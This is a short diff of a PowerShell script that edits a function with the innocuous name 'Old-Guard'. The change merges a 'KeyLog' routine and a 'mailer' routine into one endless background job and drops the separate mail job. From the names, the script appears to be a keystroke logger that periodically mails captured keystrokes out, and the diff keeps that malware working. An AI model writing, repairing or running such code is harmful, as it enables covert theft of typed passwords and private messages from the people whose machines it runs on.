@@ -237,7 +237,7 @@ function Old-Guard {
 
     $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))
 
-    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {KeyLog},{mailer}} -Name 'keys','mail' $Initil | Out-Null
+    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {KeyLog, mailer}} -Name keys $Initil | Out-Null
 
     if ($PSBoundParameters['CollectionInterval'])
     {
@@ -245,7 +245,6 @@ function Old-Guard {
 
         Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
             Stop-Job -Name keys
-            Stop-Job -Name mail
             Unregister-Event -SourceIdentifier ElapsedAction
 
             $Sender.Stop()
